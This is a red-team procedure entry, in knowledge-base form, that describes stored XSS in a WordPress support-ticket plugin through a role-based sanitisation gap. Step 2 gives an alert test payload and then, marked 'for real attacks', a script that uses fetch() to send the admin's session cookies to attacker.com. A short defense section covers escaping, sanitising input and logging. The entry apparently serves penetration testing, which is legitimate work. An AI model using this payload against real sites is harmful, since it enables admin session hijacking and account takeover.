---
tags:
  - xss
  - payload-injection
  - wordpress
type: procedure
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - WordPress
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:28:51.821Z'
skill_level: intermediate
impact_level: medium
sub_techniques: []
id: e448b278-d22f-4f84-b3bb-d1a3f3fe89c4
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Ticket-Message

## Summary

This procedure injects a JavaScript-based XSS payload into a SupportFlow ticket message, leveraging role-based sanitization bypass to store the malicious code for later execution in the admin view.

## Description

The SupportFlow plugin fails to properly sanitize ticket replies from admin or editor users via the `sanitize_ticket_reply()` function, allowing raw HTML and script tags to be stored. By submitting a ticket with an embedded `<script>` tag through the form, the payload persists in the database and is output unescaped in the admin tickets table at `/wp-admin/edit.php?post_type=sf_ticket`. This enables arbitrary JS execution in the admin's browser, such as stealing session cookies.

## Requirements

1. Logged-in WordPress user with admin or editor role
2. Access to the embedded submission form page
3. Knowledge of XSS payloads (e.g., alert or exfiltration scripts)

## Defense

Defensive measures and detection strategies:

- Apply `esc_html()` or equivalent to all outputs in `class-supportflow-admin.php` (around line 1175)
- Enforce strict sanitization regardless of user role
- Log and review ticket submissions for script tags

## Objectives

1. Store unescaped JavaScript in the ticket database
2. Bypass client/server-side validation for admins/editors
3. Prepare for admin-context execution

## Instructions

### Step 1: Access Submission Form

**Context**: Navigate to the page with the embedded form while authenticated.

Visit the published page URL with the `[supportflow_submissionform]` shortcode.

### Step 2: Fill Form with Payload

**Context**: Enter the malicious payload in the message field to exploit the sanitization gap.

Complete required fields (e.g., subject, email), then in the message textarea, input: `<script>alert('XSS');</script>`. For real attacks, use `<script>fetch('http://attacker.com/?c='+document.cookie);</script>`.

### Step 3: Submit Ticket

**Context**: Send the form to store the payload.

Click submit and confirm the ticket is created without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- payload-injection
- wordpress
